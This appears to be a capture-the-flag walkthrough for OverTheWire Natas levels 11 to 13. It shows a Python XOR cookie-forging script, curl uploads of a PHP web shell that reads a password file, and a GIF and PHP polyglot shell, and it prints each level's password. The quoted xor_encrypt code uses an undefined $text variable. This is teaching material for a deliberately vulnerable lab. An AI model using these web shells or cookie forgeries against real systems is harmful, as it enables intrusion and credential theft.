@@ -1,0 +1,133 @@
+Natas Level 11: XOR Encryption Bypass
+What You See
+A page with a background color picker
+Message: "Cookies are protected with XOR encryption"
+Source code reveals cookie handling logic
+The Vulnerability
+XOR encryption with a reused key is vulnerable to known-plaintext attacks.
+php
+function xor_encrypt($in) {
+    $key = '<censored>';  // Hidden but reused
+    $outText = '';
+    for($i=0; $i<strlen($text); $i++) {
+        $outText .= $text[$i] ^ $key[$i % strlen($key)];
+    }
+    return $outText;
+}
+Data flow:
+plain
+Array → json_encode → xor_encrypt → base64_encode → Cookie
+The Attack
+Table
+Property	Value
+Known plaintext	{"showpassword":"no","bgcolor":"#ffffff"}
+Your cookie	EGAgHwQ1IxYYMSQYGSZxTUksPFVHYDEQCC0/GBlgaVVIJDURDSQ1VRY=
+Recovered key	kBSw
+XOR property: plaintext ^ ciphertext = key
+Python Exploit
+Python
+import base64
+import json
+
+# Your cookie
+cookie = "EGAgHwQ1IxYYMSQYGSZxTUksPFVHYDEQCC0/GBlgaVVIJDURDSQ1VRY="
+
+# Known plaintext
+plaintext = b'{"showpassword":"no","bgcolor":"#ffffff"}'
+
+# Recover key
+cipher = base64.b64decode(cookie)
+key = bytes([p ^ c for p, c in zip(plaintext, cipher)])
+# Key: kBSw
+
+# Forge new cookie
+new_plain = json.dumps({"showpassword":"yes", "bgcolor":"#ffffff"})
+new_cipher = bytes([ord(new_plain[i]) ^ key[i % len(key)] for i in range(len(new_plain))])
+new_cookie = base64.b64encode(new_cipher).decode()
+# EGAgHwQ1IxYYMSQYGSZxTUtgKhIYYH9XSSA0FAQuPAVJeHNVSCQ1EQ0kNVUW
+Password for Natas 12
+plain
+EAGkE8uzFTxeoTT2mMst9Xy7PX6guEng
+Natas Level 12: Unrestricted File Upload
+What You See
+File upload form accepting JPEG images
+Hidden filename field with random name + .jpg
+The Vulnerability
+php
+$target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);
+Table
+Flaw	Explanation
+Client-controlled filename	You can modify the hidden filename field
+No content/type validation	Only checks file size, not actual file type
+The Exploit
+Upload a PHP shell by changing the extension:
+bash
+# Create PHP shell
+echo '<?php echo shell_exec("cat /etc/natas_webpass/natas13"); ?>' > shell.php
+
+# Upload with .php extension (override hidden field)
+curl -u natas12:EAGkE8uzFTxeoTT2mMst9Xy7PX6guEng \
+     -F "uploadedfile=@shell.php" \
+     -F "filename=hack.php" \
+     http://natas12.natas.labs.overthewire.org/
+Response:
+plain
+The file upload/5fheqaf3rg.php has been uploaded
+Visit the file:
+bash
+curl -u natas12:EAGkE8uzFTxeoTT2mMst9Xy7PX6guEng \
+     http://natas12.natas.labs.overthewire.org/upload/5fheqaf3rg.php
+Password for Natas 13
+plain
+g8ba0olAzaSJuyS4gnmbdVVigAICLG1k
+Natas Level 13: Magic Bytes Bypass
+What Changed from Level 12
+Table
+Level 12	Level 13
+No file type check	exif_imagetype() validates image
+php
+else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
+    echo "File is not an image";
+}
+The Vulnerability
+exif_imagetype() only checks magic bytes (first few bytes) of a file. We can prepend valid image headers to PHP code.
+Magic Bytes
+Table
+Format	Magic Bytes
+GIF	GIF89a or GIF87a
+JPEG	FF D8 FF
+PNG	89 50 4E 47
+The Exploit: Polyglot File
+Create a file that is both valid image AND valid PHP:
+bash
+printf 'GIF89a<?php echo shell_exec("cat /etc/natas_webpass/natas14"); ?>' > shell.php
+Verify magic bytes:
+bash
+xxd shell.php | head -1
+# 00000000: 4749 4638 3961 3c3f 7068 7020 6563 686f  GIF89a<?php echo
+Upload and Execute
+bash
+# Upload
+curl -u natas13:g8ba0olAzaSJuyS4gnmbdVVigAICLG1k \
+     -F "uploadedfile=@shell.php" \
+     -F "filename=hack.php" \
+     http://natas13.natas.labs.overthewire.org/
+
+# Response: The file upload/mxtu50ijee.php has been uploaded
+
+# Execute
+curl -u natas13:g8ba0olAzaSJuyS4gnmbdVVigAICLG1k \
+     http://natas13.natas.labs.overthewire.org/upload/mxtu50ijee.php
+Output:
+plain
+GIF89aA0xXu2x9FW8rb8OSQ4ei6n5VBbLUz8h8
+The GIF89a is printed as text, then the PHP executes and outputs the password.
+Password for Natas 14
+plain
+A0xXu2x9FW8rb8OSQ4ei6n5VBbLUz8h8
+Summary Table
+Table
+Level	Vulnerability	Technique	Key Lesson
+11	XOR encryption	Known-plaintext attack	XOR + reused key = broken
+12	Unrestricted upload	Extension spoofing	Don't trust client filenames
+13	Magic bytes only	Polyglot file (GIF+PHP)	Validate content, not just headers
